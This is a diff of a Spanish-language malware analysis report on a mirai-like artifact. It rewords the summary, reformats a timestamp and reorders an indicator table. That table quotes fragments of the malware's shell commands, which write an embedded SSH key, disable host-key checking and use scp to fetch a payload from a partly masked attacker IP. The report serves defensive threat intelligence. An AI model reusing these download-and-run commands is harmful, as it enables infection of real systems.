@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Cambio de permisos, Ejecución. Se asociaron 2 comandos observados o extraídos.
+Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Cambio de permisos, Ejecución. Se identificaron 2 comandos observados o extraídos. Se identificaron 6 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atr
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:36:46+00:00`
+- **Registrado:** `2026-08-09T19:36:46.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,12 +54,12 @@ UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 217.60.195.XXX | static_analysis |
 | url | hxxps://217.60.195.XXX/sh | strings |
 | url | hxxps://217.60.195.XXX/sh) | strings |
-| hash | 9b5d73ae1ae2bb3927f47a2d6078bdc26c66f075ec8681add3ec81e3c18cc258 | static_analysis |
+| ip | 217.60.195.XXX | static_analysis |
 | command | cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY----- | strings |
 | command | UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.XXX:sh out_sh; if [ $ | strings |
+| hash | 9b5d73ae1ae2bb3927f47a2d6078bdc26c66f075ec8681add3ec81e3c18cc258 | static_analysis |
 | ip | 144.31.156.XXX | artifact_source |
 
 ## 🛡️ Nota de publicación
